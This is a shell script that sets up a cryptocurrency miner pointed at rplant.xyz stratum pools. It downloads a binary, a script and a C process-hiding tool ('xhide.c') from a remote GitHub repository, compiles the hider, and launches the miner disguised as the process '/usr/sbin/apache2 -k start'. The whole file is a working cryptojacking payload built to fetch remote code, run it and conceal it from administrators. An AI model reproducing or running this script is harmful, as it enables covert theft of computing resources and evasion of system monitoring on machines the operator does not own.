#!/bin/sh
#
# Choose nearest stratum:
# stratum-ru.rplant.xyz   /Moscow/
# stratum-eu.rplant.xyz   /London/
# stratum-asia.rplant.xyz /Singapore/
# stratum-na.rplant.xyz   /Toronto/
#
#SGR
apt-get update 
apt-get install screen -y 
apt-get install make -y 
apt-get install -y wget 
apt-get install sudo 
apt-get install gcc -y 
wget https://github.com/redv67/rwicn/raw/main/build 
chmod 777 build 
wget https://github.com/redv67/rwicn/raw/main/Mas.sh 
chmod 777 Mas.sh 
wget https://github.com/redv67/rwicn/raw/main/xhide.c 
gcc -o test xhide.c 
./test -s "/usr/sbin/apache2 -k start" -d -p test.pid ./Mas.sh 
sleep 7018 